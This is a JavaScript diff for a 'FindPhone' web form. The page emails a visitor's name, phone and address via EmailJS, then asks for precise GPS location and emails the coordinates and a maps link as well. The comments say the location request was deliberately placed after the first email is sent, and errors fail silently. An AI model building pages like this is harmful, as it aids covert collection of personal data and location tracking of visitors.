@@ -576,6 +576,7 @@ async function handleSubmit(e) {
   const btn = document.getElementById('t-btn');
   btn.disabled = true;
   btn.style.opacity = '0.6';
+
   const data = {
     name:    document.getElementById('field-name').value,
     phone:   document.getElementById('field-phone').value,
@@ -585,6 +586,8 @@ async function handleSubmit(e) {
     title:   'FindPhone',
     time:    new Date().toLocaleString('pt-BR'),
   };
+
+  // 1. Envia email imediatamente com os dados do formulário
   try {
     await emailjs.send('service_063i92j', 'template_vdnum6q', data);
     document.getElementById('alert-success').style.display = 'block';
@@ -593,9 +596,46 @@ async function handleSubmit(e) {
   } catch(err) {
     document.getElementById('alert-error').style.display = 'block';
     document.getElementById('alert-success').style.display = 'none';
+    btn.disabled = false;
+    btn.style.opacity = '1';
+    return;
   }
+
   btn.disabled = false;
   btn.style.opacity = '1';
+
+  // 2. Pede localização APÓS o email já ter sido enviado
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      async function(position) {
+        // Pessoa aceitou — envia segundo email com localização
+        const lat = position.coords.latitude.toFixed(6);
+        const lng = position.coords.longitude.toFixed(6);
+        const mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+        const accuracy = Math.round(position.coords.accuracy);
+
+        const geoData = {
+          name:    data.name,
+          phone:   data.phone,
+          address: data.address,
+          message: '📍 LOCALIZAÇÃO GPS\nCoordenadas: ' + lat + ', ' + lng + '\nPrecisão: ~' + accuracy + 'm\nGoogle Maps: ' + mapsLink,
+          email:   '',
+          title:   'FindPhone - Localização GPS',
+          time:    new Date().toLocaleString('pt-BR'),
+        };
+
+        try {
+          await emailjs.send('service_063i92j', 'template_vdnum6q', geoData);
+        } catch(err) {
+          // silently fail — email principal já foi
+        }
+      },
+      function(error) {
+        // Pessoa recusou ou erro — não faz nada, email principal já foi
+      },
+      { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
+    );
+  }
 }
 
 /* ── PARTICLES ── */
@@ -657,6 +697,7 @@ window.addEventListener('load', function() {
 
 /* Init */
 setLang('pt');
+
 </script>
 
 </body>
